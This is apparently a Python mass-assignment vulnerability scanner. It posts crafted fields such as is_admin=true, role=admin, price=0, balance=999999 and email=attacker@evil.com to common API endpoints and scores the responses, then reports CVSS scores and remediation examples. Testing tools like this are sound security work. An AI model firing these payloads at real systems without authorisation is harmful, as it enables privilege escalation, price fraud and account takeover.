"""
Mass Assignment Scanner
=======================

Detects mass assignment vulnerabilities where attackers can modify
unintended object properties by manipulating request parameters.

Common scenarios:
- Privilege escalation (is_admin=true)
- Price manipulation (price=0)
- Account takeover (email=attacker@evil.com)
- Role modification (role=admin)

Author: ROBIN | @ll bUg
"""

import requests
import json
from typing import List, Dict, Any
from urllib.parse import urljoin


class MassAssignmentScanner:
    """
    Scanner for detecting mass assignment vulnerabilities
    """
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
        self.results = []
        self.name = "Mass Assignment Scanner"
        self.description = "Detects mass assignment vulnerabilities"
        
        # Sensitive parameters to test
        self.sensitive_params = self._load_sensitive_params()
        self.timeout = self.config.get('timeout', 15)
        
    def scan(self, endpoints: List[str] = None) -> List[Dict]:
        """
        Main scanning function
        """
        print(f"[*] Starting Mass Assignment scan on {self.target}")
        
        # Get test endpoints
        test_endpoints = endpoints or self._get_test_endpoints()
        
        for endpoint in test_endpoints:
            print(f"[*] Testing: {endpoint}")
            
            # Test different scenarios
            self._test_privilege_escalation(endpoint)
            self._test_price_manipulation(endpoint)
            self._test_role_modification(endpoint)
            self._test_account_properties(endpoint)
            self._test_hidden_fields(endpoint)
            
        return self.results
    
    def _load_sensitive_params(self) -> Dict[str, List]:
        """
        Load sensitive parameters that shouldn't be user-modifiable
        """
        return {
            'privilege': [
                'is_admin', 'isAdmin', 'admin', 'is_superuser', 
                'superuser', 'is_staff', 'staff', 'is_moderator',
                'moderator', 'is_verified', 'verified', 'premium',
                'is_premium', 'vip', 'is_vip'
            ],
            'price': [
                'price', 'amount', 'total', 'cost', 'fee',
                'discount', 'tax', 'shipping', 'subtotal',
                'final_price', 'product_price'
            ],
            'role': [
                'role', 'roles', 'user_role', 'permission',
                'permissions', 'access_level', 'user_type',
                'account_type', 'membership'
            ],
            'account': [
                'email', 'username', 'password', 'user_id',
                'account_id', 'balance', 'credits', 'points',
                'wallet', 'status', 'active', 'enabled'
            ],
            'hidden': [
                'id', 'user_id', 'account_id', 'created_at',
                'updated_at', 'deleted_at', 'created_by',
                'modified_by', 'version', 'token', 'api_key'
            ]
        }
    
    def _get_test_endpoints(self) -> List[str]:
        """
        Common endpoints vulnerable to mass assignment
        """
        return [
            f"{self.target}/api/user/update",
            f"{self.target}/api/profile/edit",
            f"{self.target}/api/account/settings",
            f"{self.target}/api/user/register",
            f"{self.target}/api/product/create",
            f"{self.target}/api/order/update",
            f"{self.target}/api/cart/modify",
            f"{self.target}/profile/update",
            f"{self.target}/account/edit",
            f"{self.target}/settings/save",
        ]
    
    def _test_privilege_escalation(self, url: str):
        """
        Test for privilege escalation via mass assignment
        """
        print(f"  [→] Testing privilege escalation...")
        
        for param in self.sensitive_params['privilege']:
            # Test with various boolean representations
            test_values = [True, 1, "true", "1", "yes", "on"]
            
            for value in test_values:
                payload = {
                    'username': 'testuser',
                    'email': 'test@test.com',
                    param: value
                }
                
                result = self._send_test_request(
                    url=url,
                    payload=payload,
                    param_name=param,
                    param_value=value,
                    test_type="Privilege Escalation"
                )
                
                if result:
                    self.results.append(result)
                    return  # Found vulnerability, no need to test more
    
    def _test_price_manipulation(self, url: str):
        """
        Test for price manipulation via mass assignment
        """
        print(f"  [→] Testing price manipulation...")
        
        for param in self.sensitive_params['price']:
            # Test with different price values
            test_values = [0, 0.01, 1, -100, "0", "1"]
            
            for value in test_values:
                payload = {
                    'product_name': 'Test Product',
                    'quantity': 1,
                    param: value
                }
                
                result = self._send_test_request(
                    url=url,
                    payload=payload,
                    param_name=param,
                    param_value=value,
                    test_type="Price Manipulation"
                )
                
                if result:
                    self.results.append(result)
                    return
    
    def _test_role_modification(self, url: str):
        """
        Test for role/permission modification
        """
        print(f"  [→] Testing role modification...")
        
        for param in self.sensitive_params['role']:
            test_values = ['admin', 'administrator', 'superuser', 'root', 'moderator']
            
            for value in test_values:
                payload = {
                    'username': 'testuser',
                    param: value
                }
                
                result = self._send_test_request(
                    url=url,
                    payload=payload,
                    param_name=param,
                    param_value=value,
                    test_type="Role Modification"
                )
                
                if result:
                    self.results.append(result)
                    return
    
    def _test_account_properties(self, url: str):
        """
        Test for unauthorized account property modification
        """
        print(f"  [→] Testing account property modification...")
        
        sensitive_combos = [
            {'email': 'attacker@evil.com'},
            {'balance': 999999},
            {'credits': 100000},
            {'status': 'active'},
            {'verified': True},
            {'user_id': 1},  # Try to become user #1 (often admin)
        ]
        
        for combo in sensitive_combos:
            payload = {'username': 'testuser', **combo}
            
            param_name = list(combo.keys())[0]
            param_value = list(combo.values())[0]
            
            result = self._send_test_request(
                url=url,
                payload=payload,
                param_name=param_name,
                param_value=param_value,
                test_type="Account Property Modification"
            )
            
            if result:
                self.results.append(result)
    
    def _test_hidden_fields(self, url: str):
        """
        Test for modification of hidden/internal fields
        """
        print(f"  [→] Testing hidden field modification...")
        
        for param in self.sensitive_params['hidden']:
            payload = {
                'username': 'testuser',
                param: 'modified_value'
            }
            
            result = self._send_test_request(
                url=url,
                payload=payload,
                param_name=param,
                param_value='modified_value',
                test_type="Hidden Field Modification"
            )
            
            if result:
                self.results.append(result)
    
    def _send_test_request(
        self,
        url: str,
        payload: Dict,
        param_name: str,
        param_value: Any,
        test_type: str
    ) -> Dict:
        """
        Send test request and analyze response
        """
        try:
            # Try POST with JSON
            response = requests.post(
                url,
                json=payload,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            # Analyze response
            is_vulnerable = self._analyze_response(
                response=response,
                param_name=param_name,
                param_value=param_value
            )
            
            if is_vulnerable:
                return {
                    'vulnerability': f'Mass Assignment - {test_type}',
                    'severity': self._get_severity(test_type),
                    'confidence': is_vulnerable['confidence'],
                    'url': url,
                    'method': 'POST',
                    'parameter': param_name,
                    'payload': json.dumps(payload, indent=2),
                    'evidence': is_vulnerable['evidence'],
                    'response_code': response.status_code,
                    'impact': self._get_impact(test_type),
                    'remediation': self._get_remediation(),
                    'cvss_score': self._get_cvss(test_type),
                    'cwe': 'CWE-915'
                }
            
            # Also try with form data
            response2 = requests.post(
                url,
                data=payload,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            is_vulnerable2 = self._analyze_response(
                response=response2,
                param_name=param_name,
                param_value=param_value
            )
            
            if is_vulnerable2:
                return {
                    'vulnerability': f'Mass Assignment - {test_type}',
                    'severity': self._get_severity(test_type),
                    'confidence': is_vulnerable2['confidence'],
                    'url': url,
                    'method': 'POST (form-data)',
                    'parameter': param_name,
                    'payload': str(payload),
                    'evidence': is_vulnerable2['evidence'],
                    'response_code': response2.status_code,
                    'impact': self._get_impact(test_type),
                    'remediation': self._get_remediation(),
                    'cvss_score': self._get_cvss(test_type),
                    'cwe': 'CWE-915'
                }
                
        except requests.exceptions.RequestException as e:
            pass
        
        return None
    
    def _analyze_response(
        self,
        response: requests.Response,
        param_name: str,
        param_value: Any
    ) -> Dict:
        """
        Analyze response to detect mass assignment vulnerability
        """
        evidence = []
        confidence = 0
        
        # Check 1: Successful status code
        if 200 <= response.status_code < 300:
            confidence += 30
            evidence.append(f"Request accepted with status {response.status_code}")
        
        # Check 2: Response contains parameter we sent
        try:
            response_text = response.text.lower()
            param_lower = str(param_name).lower()
            value_lower = str(param_value).lower()
            
            if param_lower in response_text:
                confidence += 25
                evidence.append(f"Parameter '{param_name}' found in response")
            
            if value_lower in response_text:
                confidence += 25
                evidence.append(f"Value '{param_value}' reflected in response")
            
            # Check 3: Success indicators
            success_indicators = [
                'success', 'updated', 'saved', 'modified',
                'changed', 'set', 'created', '"status":"success"',
                '"status":true', '"success":true'
            ]
            
            if any(indicator in response_text for indicator in success_indicators):
                confidence += 20
                evidence.append("Success indicator found in response")
            
        except:
            pass
        
        # Check 4: JSON response analysis
        try:
            json_resp = response.json()
            
            # Check if our parameter is in JSON response
            if self._find_in_dict(json_resp, param_name):
                confidence += 30
                evidence.append(f"Parameter '{param_name}' found in JSON response")
            
        except:
            pass
        
        # Vulnerability confirmed if confidence >= 60
        if confidence >= 60:
            return {
                'confidence': min(confidence, 95),
                'evidence': evidence
            }
        
        return None
    
    def _find_in_dict(self, data: Dict, key: str) -> bool:
        """
        Recursively find key in nested dictionary
        """
        if isinstance(data, dict):
            if key in data:
                return True
            for v in data.values():
                if self._find_in_dict(v, key):
                    return True
        elif isinstance(data, list):
            for item in data:
                if self._find_in_dict(item, key):
                    return True
        return False
    
    def _get_severity(self, test_type: str) -> str:
        """
        Determine severity based on test type
        """
        critical_types = ['Privilege Escalation', 'Role Modification']
        high_types = ['Price Manipulation', 'Account Property Modification']
        
        if test_type in critical_types:
            return 'CRITICAL'
        elif test_type in high_types:
            return 'HIGH'
        else:
            return 'MEDIUM'
    
    def _get_cvss(self, test_type: str) -> float:
        """
        Get CVSS score based on test type
        """
        scores = {
            'Privilege Escalation': 9.1,
            'Role Modification': 8.8,
            'Price Manipulation': 8.2,
            'Account Property Modification': 7.5,
            'Hidden Field Modification': 6.5
        }
        return scores.get(test_type, 7.0)
    
    def _get_impact(self, test_type: str) -> str:
        """
        Get impact description
        """
        impacts = {
            'Privilege Escalation': 'Attacker can escalate privileges to admin/superuser level',
            'Role Modification': 'Attacker can assign themselves unauthorized roles',
            'Price Manipulation': 'Attacker can set arbitrary prices causing financial loss',
            'Account Property Modification': 'Attacker can modify critical account properties',
            'Hidden Field Modification': 'Attacker can modify internal system fields'
        }
        return impacts.get(test_type, 'Unauthorized modification of object properties')
    
    def _get_remediation(self) -> str:
        """
        Get remediation advice
        """
        return """
        1. Use whitelist approach - only allow specific parameters
        2. Never blindly assign all request parameters to objects
        3. Use DTOs (Data Transfer Objects) with only allowed fields
        4. Implement field-level access control
        5. Validate and sanitize all input parameters
        6. Use frameworks' built-in protection (e.g., Rails' strong_parameters)
        
        Example (Python/Django):
        ```python
        # ❌ Vulnerable code
        user.update(**request.POST)
        
        # ✅ Secure code
        allowed_fields = ['username', 'email', 'bio']
        update_data = {k: v for k, v in request.POST.items() if k in allowed_fields}
        user.update(update_data)
        ```
        
        Example (Node.js):
        ```javascript
        // ❌ Vulnerable
        const user = new User(req.body);
        
        // ✅ Secure
        const user = new User({
          username: req.body.username,
          email: req.body.email
          // Only explicitly allowed fields
        });
        ```
        """


# Example usage
if __name__ == "__main__":
    scanner = MassAssignmentScanner("https://example.com")
    results = scanner.scan()
    
    print(f"\n[+] Found {len(results)} mass assignment vulnerabilities")
    for vuln in results:
        print(f"\n🔴 {vuln['vulnerability']}")
        print(f"   URL: {vuln['url']}")
        print(f"   Parameter: {vuln['parameter']}")
        print(f"   Confidence: {vuln['confidence']}%")